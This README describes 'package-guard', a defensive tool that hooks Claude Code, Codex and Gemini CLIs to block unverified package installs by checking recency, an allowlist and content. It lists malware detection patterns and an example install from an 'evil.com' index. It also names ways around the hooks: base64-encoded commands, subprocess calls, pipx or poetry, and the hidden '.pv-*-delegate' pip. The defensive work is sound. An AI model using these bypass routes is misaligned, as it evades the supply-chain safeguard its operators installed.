# package-guard

Stops AI coding assistants from installing unverified packages.

When someone uses Claude Code, Codex, or Gemini to build software, the AI will install whatever packages it thinks are needed — no verification, no review. In March 2026, the [TeamPCP campaign](https://www.aikido.dev/blog/telnyx-pypi-compromised-teampcp-canisterworm) compromised LiteLLM (95M downloads/month) and Telnyx (742K downloads/month) on PyPI with backdoored versions. Any AI assistant that suggested those packages during the attack window would have installed malware.

package-guard intercepts package installs across Python, JavaScript, Go, and Rust — checks them against an allowlist and recency signals — and blocks anything that doesn't pass.

## What it does

Package install commands get intercepted and verified before they execute:

- **Recency**: Was this version published in the last 14 days? Most supply chain attacks are caught within days of publication. This is the primary defense and is on by default.
- **Allowlist**: Is this package on the approved list? Off by default — turn on with `STRICT=1` for high-security environments.
- **Content scan** (pip only): Does the package source contain suspicious patterns? (`b64decode` + `exec`, `wave.open` + `readframes`, etc.)
- **Source blocking** (pip only): `-r requirements.txt`, local wheels, `git+https://`, `--index-url`, editable installs — all blocked by default.
- **Fail closed**: If verification can't complete (network errors, registry down), the install is blocked rather than allowed.

If verification fails, the AI gets a scrubbed error message with no file paths or bypass hints.

## Supported ecosystems

| Ecosystem | Recency check | Content scan | Source blocking | Commands intercepted |
|---|---|---|---|---|
| **Python (pip)** | PyPI API | Yes | Yes | `pip install`, `pip3 install`, `python -m pip install`, `.venv/bin/pip install` |
| **JavaScript (npm)** | npm registry | No | No | `npm install`, `npm i`, `npx`, `yarn add`, `pnpm add`, `bun add` |
| **Go** | proxy.golang.org | No | No | `go get`, `go install` |
| **Rust (cargo)** | crates.io API | No | No | `cargo add`, `cargo install` |

Commands that use existing dependencies pass through unblocked: `go build`, `cargo build`, `npm ci`, `pip list`, etc.

## Quick start

```bash
git clone https://github.com/zachcampbell/package-guard.git
cd package-guard

# System-wide (requires sudo, protects all users):
./install.sh --all

# Or user-mode (no sudo, protects your AI tools):
./install.sh --user
```

Restart your AI CLI sessions and they'll pick up the hooks.

Run `./install.sh --test` to verify, or `./tests/run-corpus.sh` for the full 98-command adversarial test suite.

## How it works

Three layers, each independent:

**Hooks** — Claude Code (`PreToolUse`), Codex CLI (`PreToolUse`), and Gemini CLI (`BeforeTool`) hooks intercept shell commands before execution. If the command contains a package install, the hook runs verification and returns a structured deny that the AI sees as feedback. Quoted strings are stripped before matching so `git commit -m "npm install stuff"` doesn't trigger a false positive.

**Wrappers** (pip only) — Drop-in replacements for `pip` and `python3` that sit earlier in PATH. The pip wrapper catches direct pip calls. The python3 wrapper catches `python3 -m pip install` and injects the pip wrapper into new venvs automatically.

**Policy** — A single config file (`policy.conf`) controls all behavior. In system mode it's root-owned and can't be modified by the AI or the user. Environment variables don't override it.

An optional fourth layer: deploy a [Nexus CE](https://help.sonatype.com/en/sonatype-nexus-repository.html) package proxy for network-level enforcement that nothing client-side can bypass.

## Install modes

| | `--all` (system) | `--user` |
|---|---|---|
| Scripts | `/opt/package-verify/` | `~/.local/share/package-verify/` |
| Wrappers | `/usr/local/bin/` | `~/.local/bin/` |
| Requires sudo | Yes | No |
| AI can remove it | No (root-owned) | Technically yes, but they'd have to find it |
| Best for | Org-wide lockdown | Individual devs, non-technical users |

## Configuration

Everything lives in `policy.conf` inside the install directory:

```ini
STRICT=0          # Recency is primary defense; set to 1 for allowlist enforcement
FAIL_CLOSED=1     # Block if verification can't complete (network errors, etc.)
MAX_AGE_HOURS=336 # Flag packages published within 14 days
SKIP_RECENCY=0    # Don't skip the recency check
SKIP_CONTENT=0    # Don't skip the content scan (pip only)
```

The allowlist is a plain text file next to it — one package per line, optional version pins:

```
requests
flask==3.0.0
github.com/gorilla/mux
serde
```

## What gets blocked (pip)

| Install method | Blocked? | Why |
|---|---|---|
| `pip install litellm` | Yes | Content scan flags it / not on allowlist |
| `pip install -r requirements.txt` | Yes | Requirements files bypass per-package verification |
| `pip install -e .` | Yes | Editable installs bypass verification |
| `pip install ./thing.whl` | Yes | Local files bypass verification |
| `pip install --index-url https://evil.com pkg` | Yes | Custom indexes could serve tampered packages |
| `.venv/bin/pip install litellm` | Yes | Venv pip is automatically replaced with the wrapper |
| `python3 -m pip install litellm` | Yes | python3 wrapper intercepts this |
| `STRICT=0 pip install litellm` | Yes | Env vars can't override policy.conf |
| `pip install requests` | No (allowed) | Passes recency check, clean content scan |
| `pip list` / `pip freeze` | No (passes through) | Not an install command |

To unblock a package, add it to the allowlist. To unblock `-r` or `-e`, use the real pip directly (the path is intentionally not in the error message — find the `.pv-*-delegate` in the venv's bin/).

## Tested against

The TeamPCP packages that were live on PyPI during the March 2026 attack:
- **litellm** — blocked by content scan (`b64decode` + `exec` co-occurrence)
- **telnyx** — blocked by recency check (published 27 hours before test)

98 adversarial command patterns tested across all three AI tool hooks, covering pip, npm, npx, yarn, pnpm, bun, go, cargo, venv paths, env var bypass attempts, compound commands, quoted strings, and alternative install methods. Full corpus in `tests/adversarial-corpus.txt`.

## Known limitations

The hooks work by pattern-matching command strings. Anything that hides the install command from the literal string — base64 encoding, Python subprocess calls, `pipx`, `poetry`, writing a script to disk — can bypass the hook layer. The pip wrapper catches most of these (if the pip binary is invoked), but programmatic pip calls through Python bypass both.

This is effective against the real threat: AI tools that generate straightforward install commands for non-technical users. It is not a sandbox. For that, use a network-level proxy.

## Platform support

Linux and macOS. Windows needs WSL or Git Bash for the hooks. Codex CLI hooks are disabled on Windows as of v0.116.0.

macOS uses POSIX-compatible utilities throughout — no GNU-specific flags.

## Uninstall

```bash
./install.sh --uninstall
```

Removes everything except the allowlist and config backups.
